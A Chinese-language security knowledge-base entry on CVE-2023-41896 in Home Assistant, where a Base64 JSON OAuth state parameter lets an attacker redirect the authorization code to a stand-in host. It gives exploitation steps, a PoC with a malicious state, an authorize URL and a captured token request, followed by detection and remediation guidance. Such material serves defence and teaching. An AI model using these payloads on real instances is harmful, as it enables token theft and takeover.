---
id: web-generic-oauth-state-json-hassurl-code-leak
title: OAuth state 不是不透明随机值而是可解析 JSON：前端按 state 中的 hassUrl 把授权码 POST 给攻击者
type: scenario
domain: web
path: web/generic/oauth
technique: oauth-state-controlled-code-delivery
tags:
- web
- oauth
- state
- authorization-code
- token-theft
- home-assistant
- client-side
cve:
- CVE-2023-41896
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: 2023.8 之前（原文：修复在 2023.8 版本中发布；CVE-2023-41896）
verification:
  verified_by: verifier-V543
  verified_at: '2026-11-11T20:33:22+08:00'
  notes: 已对照原文第七、八节与图04-06核对：state 为 Base64 JSON(hassUrl/clientId)，回调页 decodeOAuthState 后 fetchToken(state.hassUrl,...) 把 code POST 到攻击者服务器，PoC 表单字段 client_id/code/grant_type 与原文一致；CVE-2023-41896、修复 2023.8（原文时间线2023-08-02），affected_versions 2023.8 之前正确。单点链，原子；与既有 missing-state-account-link-csrf、arbitrary-redirect-uri-card 非同链。未执行 PoC。
url: /docs/web/generic/oauth/web-generic-oauth-state-json-hassurl-code-leak/
draft: false
kb_aliases:
- state 参数注入
- OAuth state JSON
- 授权码泄露
- hassUrl 劫持
- CVE-2023-41896
- OAuth 回调地址可控
---

## 一句话结论

OAuth 的 `state` 参数被实现为 Base64 编码的 JSON（含 `hassUrl`、`clientId`），回调页面 JS 直接解码 `state` 并用其中的 `hassUrl` 作为目标把授权码 POST 过去；攻击者把 `hassUrl` 改成自己的服务器、而 `client_id`/`redirect_uri` 保持合法，受害者登录后授权码就被发到攻击者手里，攻击者再兑换令牌接管实例。

## 原理

- `state` 在 OAuth 中的正确用法是：应用生成不可预测的随机值，存进当前浏览器会话，回调时比对，用于防 CSRF 并关联授权请求。它不应被客户端当作“可信配置”解析。
- 该实现把 `state` 设计成 `{"hassUrl":"...","clientId":"..."}` 的 Base64 JSON，前端回调页 `parseQuery(location.search)` 后调用 `decodeOAuthState(query.state)`，再用 `fetchToken(state.hassUrl, state.clientId, query.code)` 向 `state.hassUrl` 发起换取令牌的 POST。
- 攻击者可以把 `state` 里的 `hassUrl` 指向自己的服务器，同时让授权请求的 `client_id` 与 `redirect_uri` 都指向受害者自己的合法实例。这样授权页提示的是“你即将授予 http://homeassistant.local:8123/ 访问权限”，看起来完全正常。
- 受害者登录后，合法实例把 code 重定向回合法回调页；回调页 JS 解码攻击者的 `state`，向攻击者服务器的 `hassUrl` 发送包含 code 的 POST。攻击者收到 code 后，用合法 `client_id` 向合法实例的 `/auth/token` 兑换 access_token/refresh_token。
- 之所以能成立：授权码兑换没有把“code 发给谁”绑定到 state 的完整性校验，state 既是会话绑定材料又是可写的路由配置；前端完全信任 state 里的 URL。

## 触发条件

- OAuth 实现使用可解析的 `state`（JSON/Base64 等）并从中读取服务端地址/回调地址等配置。
- 前端回调页会向 `state` 中的地址发送授权码或令牌请求。
- 受害者会点击攻击者构造的授权链接并完成登录；攻击者能接收并读取自己服务器上的请求体。
- 授权码兑换不校验 PKCE/state 与服务端会话的一致性。

## 利用步骤

1. 分析授权回调页 JS，确认 `state` 的编码格式（如 Base64 JSON）与字段（`hassUrl`、`clientId`）。
2. 构造恶意 state：`hassUrl` 指向攻击者服务器，`clientId` 仍为合法实例地址；Base64 编码。
3. 构造授权链接：`client_id` 与 `redirect_uri` 均为受害者实例地址，`state=<恶意Base64>`。
4. 诱导受害者点击并登录；授权页显示的是受害者自己的实例地址，无明显异常。
5. 合法实例重定向回回调页，回调页 JS 用 `state.hassUrl` 把 `code` POST 到攻击者服务器；在攻击者日志/接口中读取 code。
6. 向合法实例 `/auth/token` 兑换令牌，使用令牌调用 API 接管实例。

## PoC

```text
# 1) 恶意 state（Base64 前）
{"hassUrl":"http://homeassistant.local.evil:8123/","clientId":"http://homeassistant.local:8123/"}

# 2) 授权链接：client_id/redirect_uri 合法，只把 state 换成上面的 Base64
http://homeassistant.local:8123/auth/authorize?response_type=code
  &redirect_uri=http%3A%2F%2Fhomeassistant.local%3A8123%2F%3Fauth_callback%3D1
  &client_id=http%3A%2F%2Fhomeassistant.local%3A8123%2F
  &state=<base64-of-malicious-json>
```

```http
# 3) 受害者登录后，攻击者服务器收到回调页发出的兑换请求（含 code）
POST /auth/token HTTP/1.1
Host: homeassistant.local.evil:8123
Origin: http://homeassistant.local:8123/
Sec-Fetch-Site: cross-site

------WebKitFormBoundary
Content-Disposition: form-data; name="client_id"

http://homeassistant.local:8123/
------WebKitFormBoundary
Content-Disposition: form-data; name="code"

<authorization_code>
------WebKitFormBoundary
Content-Disposition: form-data; name="grant_type"

authorization_code
------WebKitFormBoundary--
```

```text
# 4) 攻击者用收到的 code 向合法实例兑换令牌
POST http://homeassistant.local:8123/auth/token
# 预期：返回 access_token/refresh_token，可调用实例 API。
```

## 变体与关联

- 变体：`state` 不是 JSON 而是包含 URL 的序列化对象、或前端 from `state` 读取 `server`/`redirect` 字段，均可套用“可控配置 + code 外发”的模式。
- 变体：若前端用 `window.location` 跳转而不是 fetch，同样会把 code 带到攻击者域名（GET 参数）。
- 变体：移动 App 的回调处理若从 state 中读取服务器地址，也可导致 code 发给攻击者。
- 关联：[[web-generic-oauth-arbitrary-redirect-uri-code-theft]]（redirect_uri 未校验）、[[web-generic-oauth-unrestricted-client-id-consent-code-theft]]（客户端不受限）、[[web-generic-oauth-missing-state-account-link-csrf-takeover]]（另一种 state 缺失/可预测问题）。
- 边界：state 为不可预测随机值且服务端严格比对、回调页不信任 state 中的 URL、code 绑定 PKCE/客户端认证时，本场景不成立。

## 检测与防御

- 检测：授权请求的 `state` 解码后出现外部域名；回调页向非本站域名发起含 `code` 的请求（可通过 CSP/connect-src 报告发现）；授权页 Sec-Fetch-Site 为 cross-site 的 code 兑换；同一 code 在异常 IP 兑换。
- 修复：`state` 使用加密随机值，服务端保存并与浏览器会话绑定，回调时严格比对；绝不从 `state` 读取服务端地址/客户端标识；对实例地址做白名单/同源限制（如 `limitHassInstance`）。
- 加固：回调页 CSP 限制 `connect-src` 为自身域名；授权码一次性、短时效并绑定 PKCE；对外部来源的令牌请求告警；安全设计评审中把 state 视为不可信输入。
